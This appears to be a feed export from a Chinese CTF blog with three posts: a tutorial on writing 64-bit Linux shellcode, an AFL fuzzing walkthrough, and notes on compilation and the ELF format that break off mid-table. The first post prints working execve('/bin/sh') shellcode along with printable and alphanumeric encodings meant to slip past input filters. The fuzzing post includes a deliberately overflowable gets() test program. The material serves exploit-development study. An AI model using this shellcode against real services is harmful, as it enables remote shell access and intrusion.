    <updated>2020-05-08T17:28:12.585Z</updated>
    
    <content type="html"><![CDATA[<h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>目前网上主要是各种32位的shellcode编写教程，64位的比较少，这篇文章主要讲解一下64位shellcode的编写以及介绍几种比较常见的白名单绕过方法</p><h3 id="64位shellcode编写"><a href="#64位shellcode编写" class="headerlink" title="64位shellcode编写"></a>64位shellcode编写</h3><h4 id="直接pwntools生成默认shellcode"><a href="#直接pwntools生成默认shellcode" class="headerlink" title="直接pwntools生成默认shellcode"></a>直接pwntools生成默认shellcode</h4><p>这一种方法是最简单的，通过下面的代码即可生成一段64位shellcode代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure><p>但这段代码有一个缺点，就是生成的shellcode比较长，在某些空间比较小的情况不能很好的使用，接下来我们就一步一步的学习手动编写shellcode吧。</p><h4 id="手动编写shellcode"><a href="#手动编写shellcode" class="headerlink" title="手动编写shellcode"></a>手动编写shellcode</h4><p>在手动编写shellcode之前，我们首先要知道shellcode这一段代码调动shell的原理。</p><p>linux中，存在着一系列的系统调用，这些系统调用都通过syscall指令来触发，并且通过rax寄存器作为系统调用号来区分不同的系统调用，可以通过查看linux源码目录下的arch/x86/entry/syscall_64.tbl获得对应的系统调用号。比如，execve对应的的系统调用号为59。</p><p>接着，即是通过rdi和rsi两个寄存器传入参数。其中，rdi是指向运行程序的路径的指针，rsi为一个指向0的指针，rdx为0。</p><p>总结下，我们应该完成如下操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rax &#x3D; 59</span><br><span class="line">rdi &#x3D; [&#39;&#x2F;bin&#x2F;sh&#39;]</span><br><span class="line">rsi &#x3D; [0]</span><br><span class="line">rdx &#x3D; 0</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>所以就可以编写我们就可以开始正式编写了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xor rdx,rdx</span><br><span class="line">push rdx</span><br><span class="line">mov rsi,rsp</span><br><span class="line">mov rax,0x68732f2f6e69622f</span><br><span class="line">push rax</span><br><span class="line">mov rdi,rsp</span><br><span class="line">mov rax,59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>(这里因为64位数据不能直接push，所以用了rax寄存器来传递)</p><p>编写完后，我们可以用pwntools模块来快速编译使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">xor rdx,rdx;</span></span><br><span class="line"><span class="string">push rdx;</span></span><br><span class="line"><span class="string">mov rsi,rsp;</span></span><br><span class="line"><span class="string">mov rax,0x68732f2f6e69622f;</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span class="string">mov rdi,rsp;</span></span><br><span class="line"><span class="string">mov rax,59;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">shellcode = asm(shellcode)</span><br></pre></td></tr></table></figure><p>这样生成的shellcode就只有30字节，一般这种大小就足够了。</p><h3 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h3><h4 id="可打印ascii"><a href="#可打印ascii" class="headerlink" title="可打印ascii"></a>可打印ascii</h4><p>这一种的限制一般是要求shellcode为可打印字符，包括字母、数字、符号。</p><p>针对这一种白名单，已经有了一个不错的工具：<a href="https://github.com/rcx/shellcode_encoder" target="_blank" rel="noopener">shellcode_encoder</a></p><p>使用这一工具首先需要安装z3-solver：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pip install z3-solver</span><br></pre></td></tr></table></figure><p>开始生成可打印shellcode前，我们需要先将原来的shellcode输出到一个文件中，这里我们用python来执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">shellcode = <span class="string">'''</span></span><br><span class="line"><span class="string">xor rdx,rdx;</span></span><br><span class="line"><span class="string">push rdx;</span></span><br><span class="line"><span class="string">mov rsi,rsp;</span></span><br><span class="line"><span class="string">mov rax,0x68732f2f6e69622f;</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span class="string">mov rdi,rsp;</span></span><br><span class="line"><span class="string">mov rax,59;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line">f = open(<span class="string">'shellcode'</span>,<span class="string">'wb+'</span>)</span><br><span class="line">f.write(shellcode)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>然后，将生成的shellcode文件放到shellcode_encoder目录下，运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python main.py shellcode rax+29</span><br></pre></td></tr></table></figure><p>其中，shellcode是我们生成的shellcode文件，然后因为漏洞程序是通过call rax调用shellcode的，以及shellcode_encoder生成shellcode时的偏移位置，所以这里用了rax+29。</p><p>然后就会自动生成可打印的shellcode了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Original length: 30</span><br><span class="line">Encoded length:  476</span><br><span class="line">Preamble length: 29</span><br><span class="line">Total length:    505</span><br><span class="line"></span><br><span class="line">PPTAYAXVI31VXXXf-C_f-@hf-&#96;8PZTAYAXVI31VXPP[_Hc4:14:SX- (mz-i Wx5?&lt;??P^14:WX-|w_?-@U@C-@3&#96;&#125;P_Hc4:14:SX-IL+N-@x6x5?41&#125;P^14:WX-|w_?-@U@C-@3&#96;&#125;P_Hc4:14:SX-Txl(-H0| 5V__&gt;P^14:WX-|w_?-@U@C-@3&#96;&#125;P_Hc4:14:SX-Gz#&#39;-~  @5?_?_P^14:WX-|w_?-@U@C-@3&#96;&#125;P_Hc4:14:SX-e3&#39;R-T)@~5O ^?P^14:WX-|w_?-@U@C-@3&#96;&#125;P_Hc4:14:SX-&amp;Pu8-( @@57O?oP^14:WX-|w_?-@U@C-@3&#96;&#125;P_SX-:AXH-#?Hx5;~_?P_Hc4:14:SX- $80- ,  5?M7?P^14:WX-|w_?-@U@C-@3&#96;&#125;P_SX-@dG1- dyo5&lt;6?_P^SX-zphB-&#96;&#96;(~5&gt;&#x2F;o?P_AAAAo&#123;5mTM&#x3D;K8_?* *v k1jXk_DC(%r:ou&#125;&#125;n;oopM]alYoM0&quot;+&#x2F;O%Y2P9@&quot;USR2|O?+</span><br></pre></td></tr></table></figure><p>可以看到shellcode的总长是505，这样的长度对于某些特定的题目来说是不行的，所以下面介绍另一种shellcode。</p><h4 id="纯数字字母shellcode"><a href="#纯数字字母shellcode" class="headerlink" title="纯数字字母shellcode"></a>纯数字字母shellcode</h4><p>文章：<a href="https://hama.hatenadiary.jp/entry/2017/04/04/190129" target="_blank" rel="noopener">https://hama.hatenadiary.jp/entry/2017/04/04/190129</a></p><p>这里就不具体分析了，直接给出最终的shellcode，感兴趣的可以自行阅读学习</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PPYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXA</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;shellcode&quot;&gt;&lt;a href=&quot;#shellcode&quot; class=&quot;headerlink&quot; title=&quot;shellcode&quot;&gt;&lt;/a&gt;shellcode&lt;/h1&gt;&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
      <category term="文章" scheme="https://nuoye-blog.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/tags/pwn/"/>
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="shellcode" scheme="https://nuoye-blog.github.io/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>AFL-fuzz初体验</title>
    <link href="https://nuoye-blog.github.io/2020/05/09/%E6%96%87%E7%AB%A0/fuzzing/AFL-fuzz%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <id>https://nuoye-blog.github.io/2020/05/09/%E6%96%87%E7%AB%A0/fuzzing/AFL-fuzz%E5%88%9D%E4%BD%93%E9%AA%8C/</id>
    <published>2020-05-08T16:00:00.000Z</published>
    <updated>2020-05-08T17:27:54.777Z</updated>
    
    <content type="html"><![CDATA[<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>安装环境：（有点大，可以先换下源）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install clang-6.0 build-essential llvm-6.0-dev gnuplot-nox</span><br></pre></td></tr></table></figure><p>修改配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo update-alternatives --install /usr/bin/clang clang `<span class="built_in">which</span> clang-6.0` 1</span><br><span class="line">$ sudo update-alternatives --install /usr/bin/clang++ clang++ `<span class="built_in">which</span> clang++-6.0` 1</span><br><span class="line">$ sudo update-alternatives --install /usr/bin/llvm-config llvm-config `<span class="built_in">which</span> llvm-config-6.0` 1</span><br><span class="line">$ sudo update-alternatives --install /usr/bin/llvm-symbolizer llvm-symbolizer `<span class="built_in">which</span> llvm-symbolizer-6.0` 1</span><br></pre></td></tr></table></figure><p>安装afl-fuzz</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ wget http://lcamtuf.coredump.cx/afl/releases/afl-latest.tgz</span><br><span class="line">$ tar xvf afl-latest.tgz</span><br><span class="line">$ <span class="built_in">cd</span> afl-2.52b</span><br><span class="line">$ make &amp;&amp; make -C llvm_mode CXX=g++</span><br><span class="line">$ sudo make install</span><br></pre></td></tr></table></figure><p>可以看到如下提示，afl即安装成功了。</p><p><img src="./img/1.png" alt=""></p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>接下来我们用一个示例程序来演示afl-fuzz的使用。</p><h4 id="有源代码的程序"><a href="#有源代码的程序" class="headerlink" title="有源代码的程序"></a>有源代码的程序</h4><p>首先我们先写一个简单的含有栈溢出漏洞的程序来实验一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">gets(buf);</span><br><span class="line"><span class="built_in">puts</span>(buf);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们用afl-gcc来编译该程序：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-gcc -g -o afl_test test.c</span><br></pre></td></tr></table></figure><p>然后再在当前目录下创建一个input文件夹，并在里面创建一个文件（文件名也是任意），随便输入点东西：</p><p><img src="./img/2.png" alt=""></p><p>接着再运行以下指令，就开始正式的fuzzing了（其中-i参数跟随的是输入文件夹，-o跟随的是输出文件夹）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-fuzz -i input -o out afl_test</span><br></pre></td></tr></table></figure><p>运行成功后，可以看到如下提示：</p><p><img src="./img/3.png" alt=""></p><p>然后就会进入到fuzz的运行界面：</p><p><img src="./img/4.png" alt=""></p><p>其中，overall results框中的cycles done表示运行的总周期数。随着不断fuzzing，周期数会不断增加，其数值的颜色也会由洋红色变成黄色、蓝色、绿色。因为afl-fuzz是一个无限循环运行的，而当cycles done对应数值的颜色变为绿色时，代表可执行内容已经很少了，此时即可用ctrl+c来手动终止fuzzing。</p><p>关于其他数值的含义，可以查看<a href="http://lcamtuf.coredump.cx/afl/status_screen.txt" target="_blank" rel="noopener">官方文档</a>。</p><p>fuzzing终止后，我们就会在当前目录下得到一个out文件夹：</p><p><img src="./img/5.png" alt=""></p><p>其中crashes文件夹下的文件即为产生程序crash对应的输入内容，可以用xxd来分析,从而获得漏洞点：</p><p><img src="./img/6.png" alt=""></p><p>注：</p><p>如果运行afl时出现如下错误：</p><p><img src="./img/7.png" alt=""></p><p>则需要登录root账户执行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># echo core &gt;/proc/sys/kernel/core_pattern</span></span><br></pre></td></tr></table></figure><h4 id="无源码程序"><a href="#无源码程序" class="headerlink" title="无源码程序"></a>无源码程序</h4><p>大部分情况下，我们都拿不到程序的源代码，这时候可以加上-Q参数，用qemu模式来运行afl。</p><p>我们需要先开启qemu模式：</p><p>首先安装下环境：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install libtool.bin</span><br><span class="line">$ sudo apt-get install automake</span><br><span class="line">$ sudo apt-get install bison</span><br></pre></td></tr></table></figure><p>进入原先的afl安装目录，运行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> qemu_mode</span><br><span class="line">$ ./build_qemu_support.sh</span><br></pre></td></tr></table></figure><p>如果出现错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">util&#x2F;memfd.c:40:12: error: static declaration of ‘memfd_create’ follows non-static declaration</span><br></pre></td></tr></table></figure><p>首先打开build_qemu_support.sh，将这一行注释掉：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make || <span class="built_in">exit</span> 1</span><br></pre></td></tr></table></figure><p>然后运行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install qemu</span><br><span class="line">$ ./build_qemu_support.sh </span><br><span class="line">$ <span class="built_in">export</span> AFL_PATH=~/tools/afl-2.52b/</span><br></pre></td></tr></table></figure><p>就可以成功安装了。（注：这里每次启动shell都得重新添加一次环境变量，可以直接写入~/.bashrc文件末尾。）</p><p>然后还是原来的程序，这次我们用gcc编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc test.c -o <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>然后使用如下命令开始fuzzing：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ afl-fuzz -i input -o out -Q ./<span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>熟悉的界面：</p><p><img src="./img/8.png" alt=""></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>小白初学AFL：<a href="https://blog.csdn.net/weixin_39448417/article/details/99703723" target="_blank" rel="noopener">https://blog.csdn.net/weixin_39448417/article/details/99703723</a></p><p>afl-training：<a href="https://github.com/mykter/afl-training" target="_blank" rel="noopener">https://github.com/mykter/afl-training</a></p><p>初探AFL-Fuzz：<a href="https://xz.aliyun.com/t/4314#toc-8" target="_blank" rel="noopener">https://xz.aliyun.com/t/4314#toc-8</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h3&gt;&lt;h4 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h4&gt;&lt;p&gt;安装环
      
    
    </summary>
    
    
      <category term="文章" scheme="https://nuoye-blog.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/tags/pwn/"/>
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="fuzzing" scheme="https://nuoye-blog.github.io/tags/fuzzing/"/>
    
  </entry>
  
  <entry>
    <title>《程序员的自我修养》</title>
    <link href="https://nuoye-blog.github.io/2020/05/09/%E7%AC%94%E8%AE%B0/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/"/>
    <id>https://nuoye-blog.github.io/2020/05/09/%E7%AC%94%E8%AE%B0/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/</id>
    <published>2020-05-08T16:00:00.000Z</published>
    <updated>2020-05-08T17:27:31.107Z</updated>
    
    <content type="html"><![CDATA[<h1 id="编译与链接"><a href="#编译与链接" class="headerlink" title="编译与链接"></a>编译与链接</h1><h2 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h2><p>主要处理”#”开始的预编译指令，预编译后的文件扩展名为.i</p><p>（-E 表示只进行预编译）</p><h3 id="主要处理规则："><a href="#主要处理规则：" class="headerlink" title="主要处理规则："></a>主要处理规则：</h3><ol><li>将所有的”#define”删除，并且展开所有的宏定义。</li><li>处理所有条件预编译指令，比如”#if”、”#ifdef”、”#elif”、”#else”、”#endif”。</li><li>处理”#include”预编译指令，将被包含的文件插入到该预编译指令的位置。（注意，这个过程是递归进行的，也就是说被包含的文件可能还包含其他文件）</li><li>删除所有的注释”//“和”/**/“</li><li>添加行号和文件名表示，比如#2 “hello.c” 2，以便于编译时编译器产生调试用的行号信息，及用于编译时产生编译错误或警告时能够显示行号。</li><li>保留所有的”#pragram” 编译器指令，因为编译器需要使用它们。</li></ol><p>经过预编译后的.i文件不包含任何宏定义，因为所有的宏定义已经被展开，并且包含的文件也已经被插入到.i文件中。（可以通过查看.i文件来判断宏定义是否正确或头文件包含是否正确）</p><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>可分为6步：扫描、语法分析、语法定义、源代码优化、代码生成和目标代码优化</p><p>把预处理完的文件进行一系列的词法分析、语法分析、语义分析及优化后生成相应的汇编代码文件（.s）。</p><p>（-S 可得到汇编输出文件，或者直接使用cc1 hello.c也可以直接得到）</p><h3 id="词法分析（扫描器）"><a href="#词法分析（扫描器）" class="headerlink" title="词法分析（扫描器）"></a>词法分析（扫描器）</h3><p>首先源代码程序程序被输入到扫描器，运用一种类似有限状态机的算法，将源代码的字符序列分割成一系列的记号。</p><p>（lex程序可以实现词法分析）</p><h3 id="语法分析（语法分析器）"><a href="#语法分析（语法分析器）" class="headerlink" title="语法分析（语法分析器）"></a>语法分析（语法分析器）</h3><p>对由扫描器产生的记号进行语法分析，从而产生语法树。整个分析过程采用了上下文无关语法的分析手段。简单地讲，由语法分析产生的语法树就是以表达式为节点的树。</p><p>（yacc程序可以实现语法分析）</p><h3 id="语义分析（语义分析器）"><a href="#语义分析（语义分析器）" class="headerlink" title="语义分析（语义分析器）"></a>语义分析（语义分析器）</h3><p>编译器所能分析的语义是静态语义（所谓静态语义是指在编译器可以确定的语义），与之对应的是动态语义（只有在运行期才能确定的语义）</p><p>静态语义通常包含声明和类型的匹配，类型的转换。</p><p>经过语义分析阶段后，整个语法书的表达式都被标识了类型，如果有些类型需要做隐式转换，语义分析程序会在语法树中插入相应的转换节点。</p><h3 id="中间语言生成（源码级优化器）"><a href="#中间语言生成（源码级优化器）" class="headerlink" title="中间语言生成（源码级优化器）"></a>中间语言生成（源码级优化器）</h3><p>（注：此处源码级优化器在不同编译器中可能会有不同的定义或有其他的一些差异）</p><p>源代码级优化器会在源代码级别进行优化。</p><p>因为直接在语法树上作优化比较困难，所以源代码优化器往往将整个语法树转换成中间代码，它是语法树的顺序表示，已经非常接近目标代码，但一般跟目标机器和运行时的环境无关。</p><p>不同的编译器中有着不同的形式，比较常见的有：三地址码和P-代码。</p><p>中间代码使得编译器可以分为前端和后端。编译器前端负责产生机器码无关的中间代码，编译器后端将中间代码转换成目标机器代码</p><h3 id="目标代码生成与优化（代码生成器和目标代码优化器）"><a href="#目标代码生成与优化（代码生成器和目标代码优化器）" class="headerlink" title="目标代码生成与优化（代码生成器和目标代码优化器）"></a>目标代码生成与优化（代码生成器和目标代码优化器）</h3><h4 id="代码生成器"><a href="#代码生成器" class="headerlink" title="代码生成器"></a>代码生成器</h4><p>将中间代码转换成目标机器代码。</p><h4 id="目标代码优化器"><a href="#目标代码优化器" class="headerlink" title="目标代码优化器"></a>目标代码优化器</h4><p>对目标代码进行优化，比如选择合适的寻址方式、使用位移代替乘法运算、删除多余的指令等。</p><h2 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h2><p>汇编器是将汇编代码转变成机器可以执行的指令，每一个汇编语句几乎都对应一条机器指令。（.o）</p><p>（可用-c来完成汇编过程，或者用as hello.s -o hello）</p><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>把每个源代码模块独立的编译，然后按照需要将它们“组装”起来，这格组装模块的过程就是链接。链接的主要内容就是把各个模块之间相互引用的部分都处理好，使得各个模块之间能够正确地衔接。</p><p>链接过程主要包括了地址和空间分配、符号决议（有时也叫做符号绑定、名称绑定、名称决议，甚至叫做地址绑定、指令绑定。大体上一致，但从细节角度区分，”决议”更倾向静态链接，而”绑定”更倾向动态链接）和重定位等这些步骤。</p><p>（因为对于Object文件没有一个很合适的中文名称，把它叫做中间目标文件比较合适，简称为目标文件）</p><h5 id="重定位"><a href="#重定位" class="headerlink" title="重定位"></a>重定位</h5><p>地址修正的过程也被叫做重定位，每个要被修正的地方叫一个重定位入口。重定位所做的就是给程序中没个这样的绝对地址引用的位置“打补丁”，使它们指向正确的地址</p><h5 id="符号"><a href="#符号" class="headerlink" title="符号"></a>符号</h5><p>用来表示一个地址，可能是一段子程序（后来发展成函数）的起始地址，也可以是一个变量的起始地址</p><h3 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h3><h1 id="目标文件"><a href="#目标文件" class="headerlink" title="目标文件"></a>目标文件</h1><h2 id="目标文件的格式"><a href="#目标文件的格式" class="headerlink" title="目标文件的格式"></a>目标文件的格式</h2><p>从广义上看，目标文件与可执行文件的格式几乎是一样的。</p><p>（file命令可查看相应的文件格式）</p><h2 id="目标文件的内容"><a href="#目标文件的内容" class="headerlink" title="目标文件的内容"></a>目标文件的内容</h2><p>目标文件中的内容有：编译后的机械指令代码、数据，符号表、调试信息、字符串等。</p><p>一般目标文件将这些信息按不同的属性，以“节”的形式存储，有时候也叫“段”。</p><p>程序源代码编译后的机器指令经常被放在代码段里，代码段常见的名字有”.code”或”.text”；全局变量和局部静态变量数据经常放在数据段，数据段一般名字都叫”.data”。</p><p>ELF文件的开头是一个”文件头”，然后就是各个段的内容。</p><p>一般C语言的编译后执行语句都编译成机器代码，保存在.text段；已初始化的全局变量和局部静态变量都保存在.data段；未初始化的全局变量和局部静态变量一般放在一个叫”.bss”的段里。（”.bss”段只是为未初始化的全局变量和局部静态变量预留位置而已，它并没有内容，所以在文件中也不占据空间）</p><p>总体来说，程序源代码被编译以后主要分成两种段：程序指令和程序数据。代码段属于程序指令，而数据段和.bss段属于程序数据。</p><h2 id="挖掘SimpleSection-o（书中示例）"><a href="#挖掘SimpleSection-o（书中示例）" class="headerlink" title="挖掘SimpleSection.o（书中示例）"></a>挖掘SimpleSection.o（书中示例）</h2><h3 id="ELF段的结构分析"><a href="#ELF段的结构分析" class="headerlink" title="ELF段的结构分析"></a>ELF段的结构分析</h3><p>段的属性：段的长度、段所在的位置</p><h3 id="代码段"><a href="#代码段" class="headerlink" title="代码段"></a>代码段</h3><h3 id="数据段-data-和只读数据段-rodata"><a href="#数据段-data-和只读数据段-rodata" class="headerlink" title="数据段(.data)和只读数据段(.rodata)"></a>数据段(.data)和只读数据段(.rodata)</h3><p>.data段保存的是那些已经初始化了的全局静态变量和局部静态变量。</p><p>.rodata段存放的是只读数据，一般是程序里面的只读变量(如const修饰的变量)和字符串常量。</p><h3 id="BSS段"><a href="#BSS段" class="headerlink" title="BSS段"></a>BSS段</h3><p>.bss段存放的是(#`O′)初始化的全局变量和局部静态变量。</p><p>有些编译器会将全局的未初始化变量存放在目标文件.bss段，有些则不存放，只是预留一个未定义的全局变量符号，到最终链接成可执行文件的时候再在.bss段分配空间。</p><p>编译单元内部可见的静态变量是存放在.bss段的。</p><h3 id="其他段"><a href="#其他段" class="headerlink" title="其他段"></a>其他段</h3><p>.rodata1    Read only Data，这种段里存放的是只读数据，比如字符串常量、全局const变量，跟”.rodata”一样。</p><p>.comment    存放的是编译器版本信息，比如字符串:”GCC(GNU)4.2.0”</p><p>.debug    调试信息</p><p>.dynamic    动态链接信息</p><p>.hash    符号哈希表</p><p>.line    调试时的行号表，即源代码行号与编译后指令的对应表</p><p>.note    额外的编译信息，比如程序的公司名称、发布版本号等</p><p>.strtab    String Table。字符串表，用于存储ELF文件中用到的各种字符串</p><p>.symtab    Symbol Table符号表</p><p>.shstrtab    Section String Table段名表，用于保存段表中用到的字符串，最常见的就是段名</p><p>.plt和.got    动态链接的跳转表和全局入口表</p><p>.init和.fini    程序初始化与终结代码段</p><p>这些表名是系统保留的(以”.”为前缀)，应用程序也可以使用一些非系统保留的名字作为段名。</p><h2 id="ELF文件头"><a href="#ELF文件头" class="headerlink" title="ELF文件头"></a>ELF文件头</h2><p>ELF目标文件格式的最前部是ELF文件头。ELF文件头包含了描述整个文件的基本属性，比如ELF文件版本、目标机器型号、程序入口地址等。其中ELF文件中与段有关的重要结构就是段表</p><p>ELF的文件头中定义了ELF魔数、文件机器字节长度、数据存储方式、版本、运行平台、ABI版本、ELF重定位类型、硬件平台、硬件平台版本、入口地址、程序头入口和长度、段表的位置和长度及段的数量等。</p><h3 id="ELF魔数"><a href="#ELF魔数" class="headerlink" title="ELF魔数"></a>ELF魔数</h3><p>最前面的16个字节被ELF标准规定来标识ELF文件的平台属性，比如这个ELF字长（32位/64位）、字节序、ELF文件版本。如图所示：</p><p><img src="./png/ELF_magic.jpg" alt=""></p><p>最开始的4个字节是所有ELF文件都必须相同的标识码，这4个字节又被称为ELF文件的魔数。</p><p>第5个字节是用来标识ELF的文件类的，0x01表示是32位的，0x02表示是64位的。</p><p>第6个字节是字节序，规定该ELF文件是大端还是小端的。</p><p>第7个字节规定ELF文件的主版本号，一般是1。</p><p>后面9个字节ELF标准没有定义，一般填0，有些平台会使用这9个字节作为扩展标志。</p><h3 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h3><table><thead><tr><th align="left">常量</th><th>值</th><th>含义</th></tr></thead><tbody><tr><td align="left">ET_REL</td><td>1</td><td>可重定位文件，一般为.o文件</td></tr><tr><td 